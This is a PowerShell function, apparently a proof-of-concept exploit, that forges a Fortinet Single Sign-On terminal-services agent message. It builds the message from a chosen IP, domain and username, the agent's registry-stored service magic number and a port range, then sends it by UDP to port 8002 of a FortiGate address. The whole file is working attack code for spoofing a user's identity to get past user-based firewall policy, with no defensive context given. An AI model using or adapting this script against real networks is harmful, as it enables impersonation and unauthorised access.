function forge_FSSO {

    $timestamp = [DateTimeOffset]::Now.ToUnixTimeSeconds()

    # local ip
    $clientIp = "10.XX.XX.XX"

    # IP/domain/username
    $string = "10.XX.XX.XX/XXX/XXXXXX" 

    # string + padding = 35 bytes, adjust accordingly
    $paddingZero = "00 00 00 00 00 00 00 00 00 00 00 00 00"

    $unknownID = "80 00 00 14"
    $unknownEnd = "00 00"

    # Get the current service magic number value +1 with (Get-ItemProperty -Path HKLM:\SOFTWARE\WOW6432Node\Fortinet\FSAE\TSAgent).ServiceMagicNumber
    $serviceMagicNumber = 45
    
    $sessionID = 1
    $range = 1

    # To get current user assigned port range, check src_port_checker.ps1
    $portMin = 1024
    $portMax = 1223

    # Convert the client IP to bytes
    $clientIpBytes = [System.Net.IPAddress]::Parse($clientIp).GetAddressBytes()

    # Convert the string to bytes
    $stringBytes = [System.Text.Encoding]::ASCII.GetBytes($string)

    # Convert hex strings to bytes
    $paddingZeroBytes = $paddingZero -split '\s' | ForEach-Object { [System.Convert]::ToByte($_, 16) }
    $unknownIDBytes = $unknownID -split '\s' | ForEach-Object { [System.Convert]::ToByte($_, 16) }
    $unknownEndBytes = $unknownEnd -split '\s' | ForEach-Object { [System.Convert]::ToByte($_, 16) }

    # Convert int to bytes
    $timestampBytes = [BitConverter]::GetBytes([Int32]$timestamp)
    [Array]::Reverse($timestampBytes)
    $payloadLengthBytes = [BitConverter]::GetBytes([Int16]$stringBytes.Length)
    [Array]::Reverse($payloadLengthBytes)
    $serviceMagicNumberBytes = [BitConverter]::GetBytes([Int32]$serviceMagicNumber)
    [Array]::Reverse($serviceMagicNumberBytes)
    $sessionIDBytes = [BitConverter]::GetBytes([Int32]$sessionID)
    [Array]::Reverse($sessionIDBytes)
    $rangeBytes = [BitConverter]::GetBytes([Int16]$range)
    [Array]::Reverse($rangeBytes)
    $portMinBytes = [BitConverter]::GetBytes([Int16]$portMin)
    [Array]::Reverse($portMinBytes)
    $portMaxBytes = [BitConverter]::GetBytes([Int16]$portMax)
    [Array]::Reverse($portMaxBytes)

    # Forge payload
    $payload = $timestampBytes, $clientIpBytes, $payloadLengthBytes,  $stringBytes, $paddingZeroBytes, $serviceMagicNumberBytes, $unknownIDBytes, $sessionIDBytes, $unknownEndBytes, $rangeBytes, $portMinBytes, $portMaxBytes
    $payloadBytes = $null
    foreach ($p in $payload)
    {
        $payloadBytes += $p
        Write-Host ([BitConverter]::ToString($p))
    }

    # Calcul total length
    $totalLengthBytes = [BitConverter]::GetBytes([Int16]($payloadBytes.Length + 2))
    [Array]::Reverse($totalLengthBytes)

    # Final payload
    $payloadBytes = $totalLengthBytes + $payloadBytes

    # Load necessary .NET classes
    $udpClient = New-Object System.Net.Sockets.UdpClient

    # Define the destination IP address and port
    $destinationIpAddress = "10.XX.XX.XX"
    $destinationPort = 8002

    # Send the UDP datagram
    $udpClient.Send($payloadBytes, $payloadBytes.Length, $destinationIpAddress, $destinationPort)

    # Close the UdpClient
    $udpClient.Close()
}